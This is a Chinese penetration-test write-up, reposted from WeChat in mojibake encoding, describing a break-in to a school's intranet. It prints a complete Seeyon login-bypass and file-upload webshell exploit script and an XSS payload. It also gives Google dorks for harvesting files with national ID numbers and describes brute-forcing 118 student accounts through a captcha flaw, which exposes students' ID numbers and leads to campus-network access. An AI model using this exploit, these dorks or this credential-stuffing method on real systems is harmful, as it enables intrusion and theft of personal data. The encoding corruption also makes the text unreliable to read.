> **åŸæ–‡é“¾æ¥**: https://mp.weixin.qq.com/s?__biz=MzkxMzMyNzMyMA==&mid=2247573727&idx=1&sn=46160e5f077b996635e4fe656c8e8547

#  ä¿¡æ¯æ”¶é›†å®æˆ˜ï¼Œè¿›å…¥æŸæ ¡å†…ç½‘  
ç‚¹å‡»å…³æ³¨ğŸ‘‰  é©¬å“¥ç½‘ç»œå®‰å…¨   2025-06-27 09:02  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAk1nlByTOFiahZKGHekfZGC180aw53rHwCE1KXCFEyHULHRFVH3sTdiaibVFgTPic4UWScria3Vocb1TyQ/640?wx_fmt=png&from=appmsg "")  
# é€‰æ‹©ç›®æ ‡  
  
è¿›å…¥è¡¥å¤©ï¼Œé€‰æ‹©ä¸€ä¸ªç›®æ ‡  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAnluSCXwdwxNun8KwWFZNd3gJ2oI53NKh6P6IlwNvPWvJ5q0zcV2zrh3Lkp1Xf8zGeKYbeKS6SNBA/640?wx_fmt=png&from=appmsg "")  
# ä¿¡æ¯æ”¶é›†  
## çœŸå®ipæŸ¥æ‰¾  
  
ä½¿ç”¨  

```
nslookup xxx.xxx.xxx
```

  
è™½ç„¶åªæœ‰ä¸€ä¸ªipå›æ˜¾ï¼Œä½†æ˜¯è®¿é—®åå‘ç°ï¼Œå°è¯•ä½¿ç”¨httpsï¼Œå‘ç°ä¹Ÿä¸è¡Œï¼Œå› ä¸ºè¿˜æ²¡æœ‰æ‰“ç®—è·‘æµé‡ï¼Œæ‰€ä»¥å…ˆæ”¾ä¸‹  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAnluSCXwdwxNun8KwWFZNd3qLjsbSrz0AicbVhibUaiaypIGBESW60ibGOKZNRwXvw7dM5iab9kPBJQmHA/640?wx_fmt=png&from=appmsg "")  
### ä½¿ç”¨fofaè¯ä¹¦åºåˆ—å·æŸ¥æ‰¾åŠŸèƒ½å‘ç°ip  
  
ä»è¿™é‡Œè¿›å…¥  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAnluSCXwdwxNun8KwWFZNd33dY2ozgFqONcOEMTtdewwg73Xrib06C0szbzesHQaEt3VFHAFmyKFyA/640?wx_fmt=png&from=appmsg "")  
  
åœ¨è¯¦ç»†ä¿¡æ¯é‡Œé¢æ‰¾åˆ°åºåˆ—å·  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAnluSCXwdwxNun8KwWFZNd3RKVyYUTKiaGSvQ9yC5nNDyahibcr1wwibkweqPmTFWVwIZAMIwb7yNvNw/640?wx_fmt=png&from=appmsg "")  
  
æ‹¿ç™¾åº¦çš„æ¥è¯´  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAnluSCXwdwxNun8KwWFZNd331kG9PX06MYiaAYxUWCJt0fCTBtOtES3icxhutsp3d3thXdS038X5UDQ/640?wx_fmt=png&from=appmsg "")  
  
å»é™¤å†’å·ï¼Œå°†16è¿›åˆ¶è½¬æ¢ä¸º10è¿›åˆ¶  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAnluSCXwdwxNun8KwWFZNd3WBgNyqHU8qZz2iatRdfZ3HJ0CGdMFMyDUGYyoqu5c40XWrbWnbUXeIg/640?wx_fmt=png&from=appmsg "")  
  
ç›´æ¥ä½¿ç”¨certå‚æ•°è¿›è¡Œæœç´¢ï¼Œå¯ä»¥å‘ç°èƒ½å¤Ÿæ‰¾åˆ°ä¸€äº›ip  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAnluSCXwdwxNun8KwWFZNd3G5mFeKjIFT4Mxob6tCicp1eBHf4AIl2qyzxBYPDZqJMKqTVQzQuqhQw/640?wx_fmt=png&from=appmsg "")  
  
åŒç†ï¼Œä½¿ç”¨è¯¥æ–¹æ³•å‘ç°çœŸå®ip  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAnluSCXwdwxNun8KwWFZNd3n1ArVgB8xC12URxtP3XdotBic6KHoq2y3Glhmqqc0j7M0rNYtmMAicog/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAnluSCXwdwxNun8KwWFZNd37ykIQtCP6kkeDhS05wic1ibPMiahE6ssVfJPg2KcoTECo5LVFgHklMpZw/640?wx_fmt=png&from=appmsg "")  
## ä½¿ç”¨shodanç›´æ¥æŸ¥æ‰¾ipæ®µæ¼æ´  

```
shodan search --limit 100 --fields ip_str,port net:xxx.xxx.xxx.0/24 has_vuln:True
```

  
å‚æ•°è§£é‡Š  
- 
```
shodan search
```

  
: è¿™æ˜¯åŸºæœ¬çš„æœç´¢å‘½ä»¤ï¼Œç”¨æ¥å¯åŠ¨ Shodan æŸ¥è¯¢ã€‚  
  
- 
```
--limit 100
```

  
: è¿™ä¸ªé€‰é¡¹å‘Šè¯‰ Shodan è¿”å›æœ€å¤š 100 ä¸ªç»“æœã€‚é»˜è®¤æƒ…å†µä¸‹ï¼ŒShodan åªè¿”å› 100 ä¸ªç»“æœï¼Œä½†æ˜¯ä½ å¯ä»¥é€šè¿‡è¿™ä¸ªå‚æ•°æ¥æ”¹å˜è¿™ä¸ªæ•°é‡ï¼ˆå–å†³äºä½ çš„è®¢é˜…çº§åˆ«ï¼‰ã€‚  
  
- 
```
--fields ip_str,port
```

  
: è¿™ä¸ªé€‰é¡¹æŒ‡å®šä½ æƒ³è¦åœ¨ç»“æœä¸­åŒ…å«å“ªäº›å­—æ®µã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œ
```
ip_str
```

  
Â æ˜¯æŒ‡è®¾å¤‡çš„ IP åœ°å€ï¼Œ
```
port
```

  
Â æ˜¯æŒ‡å¼€æ”¾çš„æœåŠ¡ç«¯å£ã€‚  
  
- 
```
net:xxx.xxx.xxx.0/24
```

  
: è¿™æ˜¯ä¸€ä¸ªè¿‡æ»¤å™¨ï¼Œç”¨æ¥æŸ¥æ‰¾å±äºæŸä¸ªç‰¹å®šç½‘ç»œæ®µå†…çš„è®¾å¤‡ã€‚
```
xxx.xxx.xxx.0/24
```

  
Â æŒ‡çš„æ˜¯ä¸€ä¸ª CIDR è¡¨ç¤ºæ³•çš„å­ç½‘æ©ç ï¼Œä»£è¡¨çš„æ˜¯ä¸€ä¸ªä»¥Â 
```
xxx.xxx.xxx.
```

  
Â å¼€å¤´çš„æ‰€æœ‰ IP åœ°å€ã€‚ä¾‹å¦‚ï¼Œå¦‚æœä½ è¾“å…¥Â 
```
192.168.1.0/24
```

  
ï¼Œé‚£ä¹ˆå®ƒå°†æœç´¢æ‰€æœ‰Â 
```
192.168.1.*
```

  
Â çš„ IP åœ°å€ã€‚  
  
- 
```
has_vuln:True
```

  
: è¿™ä¸ªè¿‡æ»¤å™¨ç”¨æ¥æŸ¥æ‰¾å·²çŸ¥å­˜åœ¨æ¼æ´çš„è®¾å¤‡æˆ–æœåŠ¡ã€‚å¦‚æœè®¾ç½®ä¸ºÂ 
```
True
```

  
ï¼Œåˆ™åªè¿”å›é‚£äº›æœ‰å·²çŸ¥å®‰å…¨æ¼æ´çš„ç»“æœã€‚  
å¾—åˆ°5æ¡ipå›æ˜¾ï¼Œè¿›è¡Œè®¿é—®åå‘ç°æœ‰ä¸€ä¸ªä¸èƒ½ä½¿ç”¨äº†  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAnluSCXwdwxNun8KwWFZNd3DVz430uCla1Q8jA5kZqNnmSOMytmXD0Ie2ajvfloswO1iav3ZsHR4KA/640?wx_fmt=png&from=appmsg "")  
  
ä¸¤ä¸ªè¿”å›  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAnluSCXwdwxNun8KwWFZNd3f98jIlRic1yw94LoxPJVXwHJSDpkOKRMJ1pXXQgWdho0c2jPSEJibAnA/640?wx_fmt=png&from=appmsg "")  
  
è¿˜æœ‰ä¸€ä¸ªå€’æ˜¯æ­£å¸¸çš„ï¼Œä½†æ˜¯å›¾æ ‡ä¸æ­£å¸¸ï¼Œæ˜¯ä¸Šæµ·æŸæŸå­¦æ ¡ï¼Œæ—¶é—´åŸå› å°±ä¸å»éªŒè¯æ¼æ´æ˜¯å¦çœŸçš„å­˜åœ¨äº†  
æœ€åç»ˆäºæ‰¾åˆ°ä¸€ä¸ªï¼Œä¸è¿‡æ˜¯cve-2010çš„ï¼Œéƒ½æ˜¯å…³äºiisçš„ï¼Œå—¯â€¦â€¦ï¼Œå…ˆè·³è¿‡å§  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAnluSCXwdwxNun8KwWFZNd3Sov7hywSQoyjYVTEzT4ALDldooWPBh4l5K5VufcUMAC1YbV3QvfAZw/640?wx_fmt=png&from=appmsg "")  
## èµ„äº§æµ‹ç»˜  
  
ä½¿ç”¨quakeè¿›è¡Œèµ„äº§æµ‹ç»˜ï¼Œè¿›è¡ŒäºŒæ¬¡æµ‹ç»˜ï¼ŒåŸŸåå’Œå¤‡æ¡ˆå·ï¼Œæ›´åŠ å…¨é¢  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAnluSCXwdwxNun8KwWFZNd3pk1ePYHzRicAjsfcr2ys20QTOQHe6ZSsq46tZFHCRIYb51KrXTwdvkw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAnluSCXwdwxNun8KwWFZNd3Xx8YIiabhic8kVWYrTbdjKSoH45iaQLCUW3NiaSwbGXgzibxLvwFYrvVwqg/640?wx_fmt=png&from=appmsg "")  
## oneforall  
  
ä½¿ç”¨oneforallè¿›è¡Œå­åŸŸåæŸ¥æ‰¾ï¼Œæ‰¾åˆ°7890æ¡å­åŸŸå  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAnluSCXwdwxNun8KwWFZNd3Zea0tv0xbMc3t4lYwbXsIwUS7JMbxv21VyF1bRoSdP5Ok8jQpFKvVw/640?wx_fmt=png&from=appmsg "")  
## å­˜æ´»æ£€æµ‹+å»é™¤å¤šä½™å­åŸŸå  
  
å¯¹äºŒæ¬¡èµ„äº§æµ‹ç»˜å¾—åˆ°çš„æ•°æ®å’Œoneforallå¾—åˆ°çš„æ•°æ®è¿›è¡Œå»é™¤ï¼Œå¾—åˆ°12697æ¡æ•°æ®ï¼Œå¹¶ä¸”ä½¿ç”¨windfireè¿›è¡Œå­˜æ´»æ£€æµ‹ï¼Œå¾—åˆ°3437æ¡æ•°æ®  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAnluSCXwdwxNun8KwWFZNd3vvTZEKpNA5Fk0I0Q3OQBk4CO2IDqCHB5XgYNIBOZicNBMUcIMiasFo2A/640?wx_fmt=png&from=appmsg "")  
  
è¿™äº›å¤§éƒ¨åˆ†éƒ½æ˜¯vpnç™»å½•é¡µé¢çš„å­åŸŸåï¼Œæ‰€ä»¥è¿›è¡ŒäºŒæ¬¡å»é‡ï¼Œæœ€ç»ˆå¾—åˆ°162æ¡æ•°æ®  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAnluSCXwdwxNun8KwWFZNd3QL0JhZzsyBYxkjC602eVL63HibPy87otAIDLe7Tic3U6zBx2t1Bs74mw/640?wx_fmt=png&from=appmsg "")  
  
ä¹‹åå°±æ˜¯ä¸¢è¿‡å»è·‘jsfind  
## æ‰¹é‡åŸŸåå¾—ipï¼Œä½¿ç”¨shodanæœç´¢æ¼æ´  
  
ç›´æ¥è®©äººå·¥æ™ºéšœå†™ä¸€ä¸ªè„šæœ¬ï¼Œæ‰¹é‡urlæ‰§è¡Œnslookupå¾—åˆ°å»é‡ip  

```
import re
import subprocess
from urllib.parse import urlparse


def extract_domain(url):
Â  Â  &#34;&#34;&#34;ä»URLä¸­æå–åŸŸåï¼Œå¹¶å»é™¤ç«¯å£å·&#34;&#34;&#34;
Â  Â  parsed_uri = urlparse(url)
Â  Â  # è·å–netlocå¹¶å»é™¤ç«¯å£å·
Â  Â  domain = parsed_uri.netloc.split(':')[0]
Â  Â  return domain


def get_ip_from_nslookup(domain):
Â  Â  &#34;&#34;&#34;ä½¿ç”¨nslookupå‘½ä»¤è·å–åŸŸåå¯¹åº”çš„IPåœ°å€&#34;&#34;&#34;
Â  Â  try:
Â  Â  Â  Â  # æ‰§è¡Œnslookupå‘½ä»¤å¹¶è·å–è¾“å‡º
Â  Â  Â  Â  nslookup_result = subprocess.check_output(['nslookup', domain], stderr=subprocess.STDOUT, text=True)

Â  Â  Â  Â  # æŸ¥æ‰¾IPv4åœ°å€
Â  Â  Â  Â  ipv4_pattern = r'\b(?:\d{1,3}\.){3}\d{1,3}\b'
Â  Â  Â  Â  ipv4_addresses = []
Â  Â  Â  Â  addresses_started = False

Â  Â  Â  Â  for line in nslookup_result.splitlines():
Â  Â  Â  Â  Â  Â  if 'Address:' in line:
Â  Â  Â  Â  Â  Â  Â  Â  addresses_started = True
Â  Â  Â  Â  Â  Â  Â  Â  match = re.search(ipv4_pattern, line)
Â  Â  Â  Â  Â  Â  Â  Â  if match:
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  ipv4_addresses.append(match.group(0))

Â  Â  Â  Â  # è¿”å›æœ€åä¸€ä¸ªï¼ˆå³ç¬¬äºŒä¸ªï¼‰æ‰¾åˆ°çš„IPv4åœ°å€
Â  Â  Â  Â  if len(ipv4_addresses) >= 2:
Â  Â  Â  Â  Â  Â  return ipv4_addresses[1] Â # è¿”å›ç¬¬äºŒä¸ªIPv4åœ°å€

Â  Â  Â  Â  return None
Â  Â  except subprocess.CalledProcessError as e:
Â  Â  Â  Â  print(f&#34;Failed to resolve domain {domain}: {e.output}&#34;)
Â  Â  Â  Â  return None


def process_urls(input_file, output_file):
Â  Â  &#34;&#34;&#34;å¤„ç†è¾“å…¥æ–‡ä»¶ä¸­çš„URLï¼Œè·å–IPåœ°å€ï¼Œå¹¶ä¿å­˜åˆ°è¾“å‡ºæ–‡ä»¶ä¸­&#34;&#34;&#34;
Â  Â  # åˆ›å»ºä¸€ä¸ªé›†åˆæ¥å­˜å‚¨å”¯ä¸€çš„IPåœ°å€
Â  Â  unique_ips = set()

Â  Â  with open(input_file, 'r') as file:
Â  Â  Â  Â  for line in file:
Â  Â  Â  Â  Â  Â  url = line.strip()
Â  Â  Â  Â  Â  Â  if url:
Â  Â  Â  Â  Â  Â  Â  Â  domain = extract_domain(url)
Â  Â  Â  Â  Â  Â  Â  Â  ip_address = get_ip_from_nslookup(domain)
Â  Â  Â  Â  Â  Â  Â  Â  if ip_address:
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  unique_ips.add(ip_address)

Â  Â  # å°†å”¯ä¸€IPåœ°å€å†™å…¥æ–°æ–‡ä»¶
Â  Â  with open(output_file, 'w') as file:
Â  Â  Â  Â  for ip in unique_ips:
Â  Â  Â  Â  Â  Â  file.write(ip + '\n')


# ä½¿ç”¨æ–¹æ³•
input_file = 'urls.txt' Â # è¾“å…¥æ–‡ä»¶è·¯å¾„
output_file = 'resolved_ips.txt' Â # è¾“å‡ºæ–‡ä»¶è·¯å¾„

process_urls(input_file, output_file)
```

  
å¾—åˆ°ï¼Œæœ‰æ¼æ´çš„ipï¼Œä¸è¿‡ä¸å¤ªå¥½åˆ©ç”¨ï¼Œå…ˆè·³è¿‡  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAnluSCXwdwxNun8KwWFZNd3gABlrgDgQ0wern44bZKkXiaR1oLRDdPWd1MtBKAGMnUrVbWQ8DmjEMA/640?wx_fmt=png&from=appmsg "")  
## Googleæœç´¢ï¼Œå¾—åˆ°å¤§é‡å­¦å·  
  
å¾—åˆ°ä¸€äº›æ•æ„Ÿæ•°æ®ï¼Œæ¯”å¦‚é»˜è®¤å¯†ç ï¼Œè€å¸ˆçš„ç”µè¯ä¹‹ç±»çš„  

```
è°·æ­Œè¯­æ³•å¦‚ä¸‹ï¼ˆç›´æ¥copyå³å¯ï¼‰
site:.A.B.cn filetype:xls OR filetype:xlsx intext:èº«ä»½è¯
site:.A.B.cn filetype:pdf OR filetype:doc OR filetype:docx intext:èº«ä»½è¯
site:.A.B.cn filetype:xls OR filetype:xlsx &#34;èº«ä»½è¯&#34;
site:.A.B.cn filetype:pdf OR filetype:doc OR filetype:docx &#34;èº«ä»½è¯&#34;
site:.A.B.cn filetype:xls OR filetype:xlsx intitle:èº«ä»½è¯
site:.A.B.cn filetype:pdf OR filetype:doc OR filetype:docx intitle:èº«ä»½è¯

è¯­æ³•è§£é‡Š
site:æŒ‡å®šåŸŸå
inurl:ç”¨äºæœç´¢åŒ…å«çš„urlå…³é”®è¯çš„ç½‘é¡µ
intitle:æœç´¢ç½‘é¡µæ ‡é¢˜ä¸­çš„å…³é”®å­—
intext:æœç´¢ç½‘é¡µæ­£æ–‡ä¸­çš„å…³é”®å­—
filetype:æŒ‰æŒ‡å®šæ–‡ä»¶ç±»å‹å³æ–‡ä»¶åç¼€åæœç´¢
cache:å·²ç»åˆ é™¤çš„ç¼“å­˜ç½‘é¡µ
```

  
å…³é”®è¯å¯ä»¥æ›¿æ¢ä¸ºï¼š**èº«ä»½è¯|sfz|å­¦å·|xh|ç™»å½•|æ³¨å†Œ|ç®¡ç†|å¹³å°|éªŒè¯ç |è´¦å·|ç³»ç»Ÿ|æ‰‹å†Œ|é»˜è®¤å¯†ç |åˆå§‹å¯†ç |password|è”ç³»ç”µè¯|æ“ä½œæ‰‹å†Œ|vpn|åå•**  
å¾—åˆ°å¤§é‡çš„å­¦å·æ³„éœ²ï¼Œæ•´ç†äº†ä¸€ä¸‹ï¼Œå¾—åˆ°332æ¡å­¦å·  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAnluSCXwdwxNun8KwWFZNd3LYEMPaibUPza5Yj5ZJAT8Klf2kzUakQ2okox078mdDV0ia6N2KyKcZiag/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAnluSCXwdwxNun8KwWFZNd3q5Z1mhibkKOJNUEju2bLAwlPakrqXlGlr2Gwav8feibwvIaCKQzJOwIQ/640?wx_fmt=png&from=appmsg "")  
# å¯»æ‰¾åˆ©ç”¨ç‚¹  
## å°è¯•è‡´è¿œæ¼æ´ï¼ˆç™»é™†ç»•è¿‡+ä»»æ„æ–‡ä»¶ä¸Šä¼ ï¼‰  
  
https://blog.csdn.net/bring_coco/article/details/140336176  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAnluSCXwdwxNun8KwWFZNd3CFYFhct4wN8GcLywWXDMX89icdmRZ1T3smLoAULLzCGTibr32IQjX0PQ/640?wx_fmt=png&from=appmsg "")  
  
exp  

```
# coding:utf-8
import time
import requests
import re
import sys
import random
import zipfile


la = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0',
Â  Â  Â  Â  Â  Â 'Content-Type': 'application/x-www-form-urlencoded'}

def generate_random_str(randomlength=16):
Â  random_str = ''
Â  base_str = 'ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz0123456789'
Â  length = len(base_str) - 1
Â  for i in range(randomlength):
Â  Â  random_str += base_str[random.randint(0, length)]
Â  return random_str

mm = generate_random_str(8)

webshell_name1 = mm+'.jsp'
webshell_name2 = '../'+webshell_name1

def file_zip():
Â  Â  shell = 'test' Â  ## æ›¿æ¢shellå†…å®¹
Â  Â  zf = zipfile.ZipFile(mm+'.zip', mode='w', compression=zipfile.ZIP_DEFLATED)
Â  Â  zf.writestr('layout.xml', &#34;&#34;)
Â  Â  zf.writestr(webshell_name2, shell)


def Seeyon_Getshell(urllist):

Â  Â  url = urllist+'/seeyon/thirdpartyController.do'
Â  Â  post = &#34;method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04+LjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&clientPath=127.0.0.1&#34;
Â  Â  response = requests.post(url=url, data=post, headers=la)
Â  Â  if response and response.status_code == 200 and 'set-cookie' in str(response.headers).lower():
Â  Â  Â  Â  cookie = response.cookies
Â  Â  Â  Â  cookies = requests.utils.dict_from_cookiejar(cookie)
Â  Â  Â  Â  jsessionid = cookies['JSESSIONID']
Â  Â  Â  Â  file_zip()
Â  Â  Â  Â  print( 'è·å–cookieæˆåŠŸ---->> '+jsessionid)
Â  Â  Â  Â  fileurl = urllist+'/seeyon/fileUpload.do?method=processUpload&maxSize='
Â  Â  Â  Â  headersfile = {'Cookie': &#34;JSESSIONID=%s&#34; % jsessionid}
Â  Â  Â  Â  post = {'callMethod': 'resizeLayout', 'firstSave': &#34;true&#34;, 'takeOver': &#34;false&#34;, &#34;type&#34;: '0',
Â  Â  Â  Â  Â  Â  Â  Â  'isEncrypt': &#34;0&#34;}
Â  Â  Â  Â  file = [('file1', ('test.png', open(mm+'.zip', 'rb'), 'image/png'))]
Â  Â  Â  Â  filego = requests.post(url=fileurl,data=post,files=file, headers=headersfile)
Â  Â  Â  Â  time.sleep(2)
Â  Â  else:
Â  Â  Â  Â  print('è·å–cookieå¤±è´¥')
Â  Â  Â  Â  exit()
Â  Â  if filego.text:
Â  Â  Â  Â  fileid1 = re.findall('fileurls=fileurls\+&#34;,&#34;\+\'(.+)\'', filego.text, re.I)
Â  Â  Â  Â  fileid = fileid1[0]
Â  Â  Â  Â  if len(fileid1) == 0:
Â  Â  Â  Â  Â  Â  print('æœªè·å–åˆ°æ–‡ä»¶idå¯èƒ½ä¸Šä¼ å¤±è´¥ï¼')
Â  Â  Â  Â  print('ä¸Šä¼ æˆåŠŸæ–‡ä»¶idä¸º---->>:'+fileid)
Â  Â  Â  Â  Date_time = time.strftime('%Y-%m-%d')
Â  Â  Â  Â  headersfile2 = {'Content-Type': 'application/x-www-form-urlencoded','Cookie': &#34;JSESSIONID=%s&#34; % jsessionid}
Â  Â  Â  Â  getshellurl = urllist+'/seeyon/ajax.do'
Â  Â  Â  Â  data = 'method=ajaxAction&managerName=portalDesignerManager&managerMethod=uploadPageLayoutAttachment&arguments=%5B0%2C%22' + Date_time + '%22%2C%22' + fileid + '%22%5D'
Â  Â  Â  Â  getshell = requests.post(url=getshellurl,data=data,headers=headersfile2)
Â  Â  Â  Â  time.sleep(1)
Â  Â  Â  Â  webshellurl1 = urllist + '/seeyon/common/designer/pageLayout/' + webshell_name1
Â  Â  Â  Â  shelllist = requests.get(url=webshellurl1)
Â  Â  Â  Â  if shelllist.status_code == 200:
Â  Â  Â  Â  Â  Â  print('åˆ©ç”¨æˆåŠŸwebshellåœ°å€ï¼š'+webshellurl1)
Â  Â  Â  Â  else:
Â  Â  Â  Â  Â  Â  print('æœªæ‰¾åˆ°webshellåˆ©ç”¨å¤±è´¥')



def main():
Â  Â  if (len(sys.argv) == 2):
Â  Â  Â  Â  url = sys.argv[1]
Â  Â  Â  Â  Seeyon_Getshell(url)
Â  Â  else:
Â  Â  Â  Â  print(&#34;python3 Seeyon_Getshell.py http://xx.xx.xx.xx&#34;)

if __name__ == '__main__':
Â  Â  main()
```

  
åªèƒ½ä¸Šä¼ zipæ–‡ä»¶ï¼Œä¸èƒ½è§£å‹ï¼Œå¤±è´¥  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAnluSCXwdwxNun8KwWFZNd3FjL9yOiaZ0wUvhoE19Zn0I6fHS7ziaVwk8bKSs9Jx5R8EX2opsicLMJkg/640?wx_fmt=png&from=appmsg "")  
## å°è¯•rabbitmqæœªæˆæƒç™»å½•  
  
é»˜è®¤è´¦å·å¯†ç ä¸ºguest/guestï¼Œå¤±è´¥  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAnluSCXwdwxNun8KwWFZNd33RBhRflpSuCAO24J8xlruIHPGbz0RKMU9fibydtoyJBtIQzywib7U41Q/640?wx_fmt=png&from=appmsg "")  
## xss  
  
åå°„å‹xss  
å‘ç°ä¸€ä¸ªæŸ¥è¯¢æ¡†ï¼Œå°è¯•xss  

```
>&#34;'><script>alert('XSS')</script>
```

  
![](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAnluSCXwdwxNun8KwWFZNd3eiaG5WYUS9nu6mCiaibggk5hEchwWu9bGXgia1JtW35LRK0M98L5KicPvvw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAnluSCXwdwxNun8KwWFZNd3OI5SIuy60PicqvEGB2OFp0PYBAjS1aS0mGKiagPLibVNRQ8VmxYglMW4w/640?wx_fmt=png&from=appmsg "")  
## å­¦å·+å¼±å£ä»¤è¿›å…¥ï¼Œå¾—åˆ°èº«ä»½è¯  
  
çœ‹å­åŸŸåçš„jsçš„urlæ—¶å‘ç°ä¸€ä¸ªç™»å½•åœ°å€ï¼ŒæŸ¥çœ‹æ“ä½œè¯´æ˜ï¼Œå‘ç°ä½¿ç”¨äº†é»˜è®¤å¯†ç   
  
![](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAnluSCXwdwxNun8KwWFZNd37iazOGuRueY3ISbqvSHxGMMqK1dCibwMWfdjzMyzbhZUuZgDictpedJ6g/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAnluSCXwdwxNun8KwWFZNd3n3WBd0iaZnUQLECdiaFwINMJDAUs6DMmCS4ZKqwt1icwR39onP8oOE5NA/640?wx_fmt=png&from=appmsg "")  
  
éšä¾¿å°è¯•ä¸€ä¸‹ï¼Œç›´æ¥ç™»å½•æˆåŠŸï¼Œå‘ç°ç›´æ¥æ˜¾ç¤ºå­¦å·å’Œèº«ä»½è¯  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAnluSCXwdwxNun8KwWFZNd31UdtjcfqGEEFGMtonLQwOcwqpK5UEOk4oficI0GKEfJtPfibh3icA0K6g/640?wx_fmt=png&from=appmsg "")  
  
è€Œä¸”ç™»å½•çš„éªŒè¯ç æœ‰é€»è¾‘é”™è¯¯ï¼Œç¬¬ä¸€æ¬¡éªŒè¯ç æ­£ç¡®ä»¥åéƒ½ä¸éªŒè¯ï¼Œç›´æ¥çˆ†ç ´ï¼Œä½¿ç”¨ä¹‹å‰å¾—åˆ°çš„332ä¸ªå­¦å·ï¼ŒæˆåŠŸäº†118æ¡å­¦å·  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAnluSCXwdwxNun8KwWFZNd35icbyTqic2LcLEVecMzLRic77YhDeApia9jSljlBLib7JbTcVgVchbCibghg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAnluSCXwdwxNun8KwWFZNd33ykOcHe0bL1ia259doDASuiaoQkaO4hwGdwL9Z9vLhqMtU3NLIufxwBQ/640?wx_fmt=png&from=appmsg "")  
## ç™»å½•æ ¡å›­ç½‘  
  
å’Œå¤§å¤šæ•°å­¦æ ¡ä¸€æ ·ï¼Œæ ¡å›­ç½‘æ˜¯å­¦å·+èº«ä»½è¯å6ä½  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAnluSCXwdwxNun8KwWFZNd3OjKHUIsoTCOhibX9mkjmdrbZ4vGpmgA1jO1E0HObMHtS0VkSehcLa3w/640?wx_fmt=png&from=appmsg "")  
  
éšä¾¿å°è¯•ä¸€ä¸‹ï¼Œç›´æ¥æˆåŠŸï¼Œè®¿é—®äº†å­¦æ ¡çš„å†…ç½‘  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAnluSCXwdwxNun8KwWFZNd3Gq5KJB5ZHPO5EtibSHyEb8kzQdfomdGQoopngSdwndgHlLic1ehK8Npg/640?wx_fmt=png&from=appmsg "")  
  
æ–‡ç« ä½œè€…ï¼šå…ˆçŸ¥ç¤¾åŒºï¼ˆ1857183611297207ï¼‰  
  
æ–‡ç« æ¥æºï¼šhttps://xz.aliyun.com/t/16089  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/iaIicfo73Ma1vawibO9wLYILrhQIfwChvgOImKZkuNWI8GOooRxib2zV6HqibN8GUXECib6tPedP736qeiblicT5gTbstA/640?wx_fmt=gif&from=appmsg&wxfrom=5&wx_lazy=1&tp=wxpic "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/iaIicfo73Ma1vawibO9wLYILrhQIfwChvgOEXaomibCwQ36dT7GScLFgT1AYy0XC4lwiczUaMBenbyMY2NBDr2p7wnw/640?wx_fmt=gif&from=appmsg&wxfrom=5&wx_lazy=1&tp=wxpic "")  
  
[482é¡µï¼éå¸¸å…¨é¢ç‰›å‰çš„Linuxåº”æ€¥å“åº”æ‰‹å†Œï¼Œç½‘å®‰äººå¿…å¤‡](https://mp.weixin.qq.com/s?__biz=MzkxMzMyNzMyMA==&mid=2247573621&idx=1&sn=56af8c3724f68f6f71066c70fda829e0&scene=21#wechat_redirect)  
  
  
[ä½¿ç”¨è‡ªåŠ¨åŒ–å·¥å…·å¯»æ‰¾sqlæ³¨å…¥æ¼æ´](https://mp.weixin.qq.com/s?__biz=MzkxMzMyNzMyMA==&mid=2247569683&idx=1&sn=450e5eb00d776c71a52dff655d3bea37&scene=21#wechat_redirect)  
  
  
